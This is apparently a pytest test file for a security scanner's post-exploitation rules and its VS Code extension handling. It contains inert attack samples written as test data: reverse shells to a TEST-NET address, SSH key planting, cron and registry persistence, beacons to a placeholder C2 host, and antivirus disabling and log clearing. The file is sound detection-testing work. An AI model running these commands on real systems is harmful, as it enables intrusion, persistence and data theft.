"""Post-exploitation tactics (ST-POSTEX-*), the chain combination, and VS Code extension coverage.

Samples are inert: TEST-NET addresses, `.invalid` hosts, placeholder keys and tokens.
"""

from __future__ import annotations

import time
import zipfile
from pathlib import Path

import pytest

from skilltotal import engine
from skilltotal.collector import detect_component
from skilltotal.engine import analyze_directory
from skilltotal.file_index import MAX_FILE_BYTES, FileIndex
from skilltotal.models import ThreatClass
from skilltotal.rules import get_rules
from skilltotal.scanners.base import TACTICS
from skilltotal.scanners.postex import PostExploitationScanner
from skilltotal.scoring import POSTEX_CHAIN_FINDING_ID

_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLACEHOLDERPLACEHOLDERPLACEHOLDER x"


def _analyze(root: Path):
    return analyze_directory(root, detect_component(root, source=str(root)))


def _write(root: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8", newline="")
    return root


def _ids(report) -> set[str]:
    return {f.id for f in report.findings}


def _scan(tmp_path: Path, name: str, text: str):
    return _analyze(_write(tmp_path, {name: text}))


# --- Each family fires on its shapes -------------------------------------------------------------

@pytest.mark.parametrize(("name", "text"), [
    ("a.js", 'spawn("ssh", ["-N", "-R", "*:0:localhost:22", "t@relay.invalid"]);\n'),
    ("a.sh", "autossh -M 0 -N -R 2222:127.0.0.1:22 t@relay.invalid\n"),
    ("a.py", 'subprocess.run(["ssh", "-R", "0:127.0.0.1:3389", "t@relay.invalid"])\n'),
    ("a.js", f'const K = "{_KEY}";\nfs.appendFileSync(home + "/.ssh/authorized_keys", K);\n'),
    ("a.py", f'K = "{_KEY}"\nwith open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as f:\n'
             "    f.write(K)\n"),
    ("a.sh", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n"),
    ("a.sh", "nc 203.0.113.9 4444 -e /bin/sh\n"),
    ("a.sh", "socat tcp:203.0.113.9:4444 exec:'bash -li',pty\n"),
    ("a.py", "import socket, os\ns = socket.socket()\ns.connect(('203.0.113.9', 4444))\n"
             "os.dup2(s.fileno(), 0)\n"),
    ("a.js", 'const net = require("net");\nconst c = net.connect(4444, "203.0.113.9");\n'
             'const sh = spawn("/bin/sh", []);\nc.pipe(sh.stdin);\nsh.stdout.pipe(c);\n'),
    ("a.ps1", "$c = New-Object System.Net.Sockets.TCPClient('203.0.113.9', 4444)\n"
              "$s = $c.GetStream()\n$r = iex $data\n"),
    ("a.py", 'subprocess.Popen(["cloudflared", "tunnel", "run", "--token", '
             '"eyJhIjoiUExBQ0VIT0xERVIiLCJ0IjoiUExBQ0VIT0xERVIifQ"])\n'),
    ("a.sh", "ngrok tcp 22\n"),
    ("a.sh", "tailscale up --authkey tskey-auth-PLACEHOLDER\n"),
    ("a.sh", "chisel client 203.0.113.9:8000 R:2222:localhost:22\n"),
    ("a.js", 'spawn("code", ["tunnel", "--accept-server-license-terms"], { detached: true });\n'),
    ("a.sh", "devtunnel host -p 22\n"),
    ("a.sh", "sudo systemsetup -setremotelogin on\n"),
    ("a.ps1", "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0\n"),
    ("a.bat", 'reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" '
              "/v fDenyTSConnections /t REG_DWORD /d 0 /f\n"),
    ("a.bat", "net user support P4ssw0rd! /add\n"),
    ("a.sh", "dscl . -create /Users/svc_helper IsHidden 1\n"),
])
def test_remote_access_fires(tmp_path: Path, name: str, text: str):
    assert "ST-POSTEX-REMOTE-ACCESS" in _ids(_scan(tmp_path, name, text))


@pytest.mark.parametrize(("name", "text"), [
    # A web port published through localhost.run / serveo / ngrok with the user's own token.
    ("a.js", 'spawn("ssh", ["-R", "80:localhost:3000", "nokey@localhost.run"]);\n'),
    ("a.sh", "ssh -R 80:localhost:8080 serveo.net\nngrok http 3000\n"),
    # The user's own key, from the environment: no literal key.
    ("a.sh", 'echo "$SSH_PUBLIC_KEY" >> ~/.ssh/authorized_keys\n'),
    # A port probe, not a shell bound to a socket.
    ("a.sh", 'timeout 1 bash -c "</dev/tcp/$host/$port" && echo up\n'),
    # Mentioned in a comment only.
    ("a.js", "// ssh -N -R '*:0:localhost:22' relay\n"),
    ("a.py", '"""Run: systemsetup -setremotelogin on"""\n'),
    # Inspecting a tunnel is not starting one.
    ("a.sh", "code tunnel status\n"),
    # User management in a configuration tool: the account comes from a parameter (salt-ssh).
    ("a.py", "cmd = \"dscl . -create /Users/{} Password '*'\".format(name)\n"),
    ("a.bat", "net user %1 %2 /add\n"),
])
def test_remote_access_silent(tmp_path: Path, name: str, text: str):
    assert "ST-POSTEX-REMOTE-ACCESS" not in _ids(_scan(tmp_path, name, text))


@pytest.mark.parametrize(("name", "text"), [
    ("a.js", 'const p = path.join(home, "Library/LaunchAgents/com.example.x.plist");\n'
             "fs.writeFileSync(p, plist);\n"),
    ("a.sh", '(crontab -l; echo "@reboot $HOME/.x") | crontab -\n'),
    ("a.py", 'subprocess.run(["crontab", "-"], input=job, text=True)\n'),
    ("a.sh", "cp x.service ~/.config/systemd/user/x.service\nsystemctl --user enable x\n"),
    ("a.bat", "schtasks /create /tn Updater /sc onlogon /tr C:\\x\\u.exe\n"),
    ("a.ps1", "$t = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName U "
              "-Trigger $t\n"),
    ("a.py", 'k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\'
             'CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)\n'
             'winreg.SetValueEx(k, "U", 0, 1, x)\n'),
    ("a.js", 'fs.copyFileSync(src, path.join(appData, "Microsoft\\\\Windows\\\\Start Menu\\\\'
             'Programs\\\\Startup\\\\u.cmd"));\n'),
    ("a.sh", "echo 'source ~/.x/init.sh' >> ~/.zshrc\n"),
])
def test_persistence_fires(tmp_path: Path, name: str, text: str):
    assert "ST-POSTEX-PERSIST" in _ids(_scan(tmp_path, name, text))


@pytest.mark.parametrize(("name", "text"), [
    # Reading or listing autostart locations writes nothing.
    ("a.js", 'const agents = fs.readdirSync(path.join(home, "Library/LaunchAgents"));\n'),
    ("a.sh", "crontab -l | grep backup\n"),
    ("a.js", 'const out = execSync("reg query HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\'
             'CurrentVersion\\\\Run");\n'),
    ("a.sh", 'grep -q init ~/.zshrc && echo "already set up"\n'),
])
def test_persistence_silent(tmp_path: Path, name: str, text: str):
    assert "ST-POSTEX-PERSIST" not in _ids(_scan(tmp_path, name, text))


_AGENT_WRITE = 'fs.writeFileSync(path.join(home, "Library/LaunchAgents/{}.plist"), x);\n'


@pytest.mark.parametrize(("name", "text", "fires"), [
    ("a.js", _AGENT_WRITE.format("com.apple.updated"), True),
    ("a.bat", "schtasks /create /tn MicrosoftEdgeUpdateTaskCore /sc onlogon /tr C:\\x\\u.exe\n",
     True),
    ("a.ps1", 'Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $a -Trigger $t\n',
     True),
    ("a.bat", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth "
              "/d C:\\x\\u.exe /f\n", True),
    # Its own reverse-DNS label, or Apple's own agent re-enabled in place: not masquerading.
    ("a.js", _AGENT_WRITE.format("com.example.agent"), False),
    ("a.sh", "launchctl load -w /System/Library/LaunchAgents/com.apple.Siri.agent.plist\n",
     False),
    ("a.bat", "schtasks /create /tn AcmeUpdater /sc onlogon /tr C:\\x\\u.exe\n", False),
])
def test_masquerade(tmp_path: Path, name: str, text: str, fires: bool):
    report = _scan(tmp_path, name, text)
    assert ("ST-POSTEX-MASQUERADE" in _ids(report)) is fires
    if fires:
        assert report.verdict["has_malicious_indicators"] is True


@pytest.mark.parametrize(("text", "fires"), [
    ('const names = Object.keys(process.env).filter((k) => /KEY|TOKEN|SECRET/.test(k));\n'
     "const body = JSON.stringify({ h: os.hostname(), n: names });\n"
     'https.request({ host: "c2.example.invalid", method: "POST" }).end(body);\n', True),
    ('const ip = await (await fetch("https://api.ipify.org")).text();\n'
     "const who = os.userInfo().username + ip;\n"
     'await fetch("https://c2.example.invalid/in", { method: "POST", body: who });\n', True),
    ('fetch("http://203.0.113.5:8443/in", { method: "POST", body: os.hostname() });\n', True),
    # A crash reporter: host and user name sent to the publisher's own domain.
    ('const meta = { host: os.hostname(), user: os.userInfo().username };\n'
     'fetch("https://telemetry.example.invalid/crash", { method: "POST", body: meta });\n',
     False),
    # A private address is a local service, not a call home.
    ('fetch("http://192.168.1.10:8080/status", { body: os.hostname() });\n', False),
])
def test_beacon(tmp_path: Path, text: str, fires: bool):
    assert ("ST-POSTEX-BEACON" in _ids(_scan(tmp_path, "a.js", text))) is fires


@pytest.mark.parametrize(("text", "fires"), [
    ("Add-MpPreference -ExclusionPath $env:APPDATA\\x\n", True),
    ("Set-MpPreference -DisableRealtimeMonitoring $true\n", True),
    ("spctl --master-disable\n", True),
    ("xattr -d com.apple.quarantine ./tool\n", True),
    ("ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null host\n", True),
    ("wevtutil cl Security\n", True),
    ("ssh -o StrictHostKeyChecking=no host\n", False),
    ("xattr -l ./tool\n", False),
])
def test_evasion(tmp_path: Path, text: str, fires: bool):
    assert ("ST-POSTEX-EVASION" in _ids(_scan(tmp_path, "a.ps1", text))) is fires


def test_signature_list_is_data_not_behavior(tmp_path: Path):
    # A security tool keeps whole command lines as data; none of them runs.
    report = _scan(tmp_path, "sigs.py", (
        "SIGNATURES = [\n"
        '    "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",\n'
        '    "systemsetup -setremotelogin on",\n'
        '    "(crontab -l; echo \\"@reboot /tmp/x\\") | crontab -",\n'
        "]\n"
    ))
    assert not {i for i in _ids(report) if i.startswith("ST-POSTEX")}


def test_argv_array_is_behavior(tmp_path: Path):
    # One command line inside an argv array is still a command.
    report = _scan(tmp_path, "a.py",
                   'subprocess.run(["bash", "-c", "systemsetup -setremotelogin on"])\n')
    assert "ST-POSTEX-REMOTE-ACCESS" in _ids(report)


def test_every_postex_finding_carries_evidence(tmp_path: Path):
    report = _scan(tmp_path, "a.sh", (
        f'echo "{_KEY}" >> ~/.ssh/authorized_keys\n'
        '(crontab -l; echo "@reboot autossh -N -R 2222:localhost:22 t@relay.invalid") | crontab -\n'
    ))
    postex = [f for f in report.findings if f.id.startswith("ST-POSTEX")]
    assert postex
    for f in postex:
        assert f.evidence and all(e.file and e.line_start >= 1 and e.snippet for e in f.evidence)


@pytest.mark.parametrize("text", [
    # A long signature list: walked once, not once per element.
    "const L = [\n" + '  "launchctl load ~/Library/LaunchAgents/x.plist",\n' * 6_000 + "];\n",
    # Thousands of anchors with nothing next to them: each window is not searched afresh.
    "LaunchAgents schtasks authorized_keys @reboot CurrentVersion\\Run\n" * 8_000,
], ids=["signature-list", "bare-anchors"])
def test_padded_input_stays_linear(tmp_path: Path, text: str):
    (tmp_path / "a.js").write_text(text, encoding="utf-8")
    index = FileIndex.build(tmp_path)
    start = time.process_time()
    result = PostExploitationScanner().scan(index)
    assert time.process_time() - start < 2.0
    assert not result.findings


# --- The chain ------------------------------------------------------------------------------------

def test_chain_needs_a_way_in_or_a_call_home(tmp_path: Path):
    report = _scan(tmp_path, "a.sh", (
        "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n"
        "echo 'source ~/.x/init.sh' >> ~/.zshrc\n"
    ))
    chain = next(f for f in report.findings if f.id == POSTEX_CHAIN_FINDING_ID)
    assert chain.threat_class is ThreatClass.MALICIOUS_INDICATOR
    assert chain.severity.value == "critical"
    assert len(chain.evidence) == 2  # one line per tactic
    assert report.verdict["has_malicious_indicators"] is True


def test_persistence_plus_evasion_alone_is_not_a_chain(tmp_path: Path):
    # An installer that registers a logon task and runs PowerShell with the policy bypassed.
    report = _scan(tmp_path, "setup.ps1", (
        "$t = New-ScheduledTaskTrigger -AtLogOn\n"
        "Register-ScheduledTask -TaskName AcmeSync -Trigger $t\n"
        "powershell -ExecutionPolicy Bypass -File sync.ps1\n"
    ))
    ids = _ids(report)
    assert "ST-POSTEX-PERSIST" in ids and "ST-SHELL-EVASION" in ids
    assert POSTEX_CHAIN_FINDING_ID not in ids
    assert report.verdict["has_malicious_indicators"] is False


def test_documented_commands_do_not_chain(tmp_path: Path):
    report = _analyze(_write(tmp_path, {
        "docs/ir.sh": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n"
                      "echo 'x' >> ~/.zshrc\n",
        "index.js": "module.exports = 1;\n",
    }))
    assert not {i for i in _ids(report) if i.startswith("ST-POSTEX")}


def test_chain_is_not_counted_again_by_convergence(tmp_path: Path):
    # Chain + masquerade: one indicator outside the chain, so no ST-CONVERGENCE on top.
    report = _scan(tmp_path, "a.js", (
        'spawn("ssh", ["-N", "-R", "0:localhost:22", "t@relay.invalid"]);\n'
        'fs.writeFileSync(path.join(home, "Library/LaunchAgents/com.apple.updated.plist"), x);\n'
    ))
    ids = _ids(report)
    assert {POSTEX_CHAIN_FINDING_ID, "ST-POSTEX-MASQUERADE"} <= ids
    assert "ST-CONVERGENCE" not in ids


def test_tactics_are_declared_on_rules():
    tactics = {r.id: r.tactic for r in get_rules() if r.tactic}
    assert set(tactics.values()) == set(TACTICS)
    # Existing persistence rules joined the family instead of being duplicated.
    for rule_id in ("ST-AGENT-CONFIG-PERSIST", "ST-GIT-HOOK-PERSIST", "ST-PTH-EXEC",
                    "ST-STARTUP-HOOK-EXEC", "ST-PTH-IMPORT-EXEC"):
        assert tactics[rule_id] == "persistence"
    assert tactics["ST-SHELL-EVASION"] == "defense_evasion"


# --- VS Code extensions ---------------------------------------------------------------------------

_EXT_MANIFEST = (
    '{"name": "x", "publisher": "example", "version": "1.0.0", '
    '"engines": {"vscode": "^1.90.0"}, "main": "./dist/extension.js"}\n'
)
_SHELL_CALL = 'require("child_process").exec("id");\n'


def test_vsix_layout_is_a_vscode_extension_and_its_bundle_is_read(tmp_path: Path):
    root = _write(tmp_path, {
        "extension.vsixmanifest": "<PackageManifest/>\n",
        "extension/package.json": _EXT_MANIFEST,
        "extension/dist/extension.js": _SHELL_CALL,
    })
    component = detect_component(root, source=str(root))
    assert component.type == "vscode_extension"
    assert component.name == "x" and component.version == "1.0.0"
    assert "ST-SHELL-NODE" in _ids(analyze_directory(root, component))


def test_packed_vsix_file_is_read(tmp_path: Path):
    vsix = tmp_path / "x-1.0.0.vsix"
    with zipfile.ZipFile(vsix, "w") as zf:
        zf.writestr("extension.vsixmanifest", "<PackageManifest/>\n")
        zf.writestr("[Content_Types].xml", "<Types/>\n")
        zf.writestr("extension/package.json", _EXT_MANIFEST)
        zf.writestr("extension/dist/extension.js", _SHELL_CALL)
    report = engine.analyze(str(vsix))
    assert report.component.type == "vscode_extension"
    assert "ST-SHELL-NODE" in _ids(report)


def test_root_manifest_with_vscode_engine_is_an_extension(tmp_path: Path):
    root = _write(tmp_path, {"package.json": _EXT_MANIFEST, "dist/extension.js": _SHELL_CALL})
    report = _analyze(root)
    assert report.component.type == "vscode_extension"
    assert "ST-SHELL-NODE" in _ids(report)


def test_extension_folder_beside_other_files_is_not_a_vsix(tmp_path: Path):
    # A repository with an `extension/` subfolder and its own files is not an unpacked .vsix.
    root = _write(tmp_path, {
        "README.md": "# repo\n",
        "extension/package.json": _EXT_MANIFEST,
        "extension/dist/extension.js": _SHELL_CALL,
    })
    assert detect_component(root, source=str(root)).type != "vscode_extension"


def test_npm_package_layout_unchanged(tmp_path: Path):
    root = _write(tmp_path, {
        "package.json": '{"name": "y", "version": "1.0.0", "main": "dist/index.js"}\n',
        "dist/index.js": _SHELL_CALL,
    })
    report = _analyze(root)
    assert report.component.type == "npm_package"
    assert "ST-SHELL-NODE" in _ids(report)


def _minified(body: str) -> str:
    filler = "var a" + "=1,a".join(str(i) for i in range(6000)) + ";"
    return filler + body + filler


def test_extension_bundle_keeps_capabilities_and_tactics_and_demotes_other_risk(tmp_path: Path):
    bundle = _minified(
        'require("child_process").exec("id");'
        'fs.readFileSync(os.homedir()+"/.aws/credentials");'
        'spawn("ssh",["-N","-R","0:localhost:22","t@relay.invalid"]);'
    )
    ext = _write(tmp_path / "ext", {
        "package.json": _EXT_MANIFEST.replace("./dist/extension.js", "./extension.js"),
        "extension.js": bundle,
    })
    ids = _ids(_analyze(ext))
    assert {"ST-SHELL-NODE", "ST-POSTEX-REMOTE-ACCESS"} <= ids
    assert "ST-SENS-PATH" not in ids  # a risk claim inside a bundle: needs_review
    pkg = _write(tmp_path / "pkg", {
        "package.json": '{"name": "y", "version": "1.0.0", "main": "./extension.js"}\n',
        "extension.js": bundle,
    })
    assert "ST-SENS-PATH" in _ids(_analyze(pkg))  # an npm main is scored as before


def test_large_entry_point_is_indexed_only_with_a_raised_limit(tmp_path: Path):
    big = tmp_path / "extension.js"
    big.write_text("x" * (MAX_FILE_BYTES + 10), encoding="utf-8")
    plain = FileIndex.build(tmp_path, keep_minified={"extension.js"})
    assert not plain.files and plain.large == ["extension.js"]
    raised = FileIndex.build(tmp_path, keep_minified={"extension.js"},
                             keep_max_bytes=4 * MAX_FILE_BYTES)
    assert [f.relpath for f in raised.files] == ["extension.js"]
